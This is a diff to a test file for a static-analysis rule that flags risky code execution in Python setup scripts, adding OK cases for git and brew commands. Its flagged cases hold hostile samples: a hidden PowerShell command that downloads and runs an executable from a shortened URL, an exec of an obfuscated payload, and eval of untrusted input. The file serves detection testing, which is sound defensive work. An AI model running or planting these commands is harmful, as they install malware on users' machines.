@@ -3,6 +3,7 @@
     OK cases:
         - Executing python files to extract version information
         - Os.system used for setup purposes
+        - Executing git commands
     RULEID cases:
         - executing bash commands
 """
@@ -51,6 +52,9 @@ def get_version():
 """ OK: os.system used for setup purposes
 """
 # ok: code-execution
+os.popen('brew --prefix libffi')
+
+# ok: code-execution
 os.system('python setup.py sdist bdist_wheel')
 
 # ok: code-execution
@@ -63,14 +67,17 @@ os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))
 os.system('git tag v{0}'.format(about['__version__']))
 
 
-""" RULEID: executing bash commands 
+""" OK: executing git commands
 """
-# ruleid: code-execution
+# ok: code-execution
 os.popen("cd %s && git init " % TEST_MODULES_ROOT)
 
-# ruleid: code-execution
+# ok: code-execution
 popen("cd %s && git init " % TEST_MODULES_ROOT)
 
+
+""" RULEID: executing bash commands 
+"""
 # ruleid: code-execution
 os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")
 
@@ -79,3 +86,10 @@ exec("o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPv
 
 # ruleid: code-execution
 subprocess.call('/tmp/reloan')
+
+# ruleid: code-execution
+eval("print('hi')")
+
+if line.startswith('DANGEROUS'):
+    # ruleid: code-execution
+    eval(line)
